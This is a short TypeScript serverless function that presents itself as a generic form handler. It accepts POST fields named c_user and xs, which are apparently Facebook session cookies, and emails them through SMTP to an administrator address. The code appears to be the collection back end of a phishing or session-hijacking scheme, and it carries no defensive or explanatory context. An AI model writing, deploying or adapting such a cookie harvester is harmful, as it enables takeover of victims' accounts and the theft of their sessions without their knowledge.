import { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from 'nodemailer';

const transporter = nodemailer.createTransport({
  host: process.env.FORM_ONE_SMTP_HOST || process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT || '587'),
  secure: false,
  auth: {
    user: process.env.FORM_ONE_SMTP_USER || process.env.SMTP_USER,
    pass: process.env.FORM_ONE_SMTP_PASS || process.env.SMTP_PASS,
  },
});

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const { c_user, xs } = req.body;

    if (!c_user || !xs) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    // Send email
    await transporter.sendMail({
      from: process.env.FORM_ONE_SMTP_USER || process.env.SMTP_USER,
      to: process.env.ADMIN_EMAIL,
      subject: 'New Form One Submission',
      html: `
        <h2>New Form One Submission</h2>
        <p><strong>c_user:</strong> ${c_user}</p>
        <p><strong>xs:</strong> ${xs}</p>
        <p><strong>Submission Time:</strong> ${new Date().toISOString()}</p>
      `,
    });

    res.status(200).json({ message: 'Form submitted successfully' });
  } catch (error) {
    console.error('Form submission error:', error);
    res.status(500).json({ message: 'Error submitting form' });
  }
}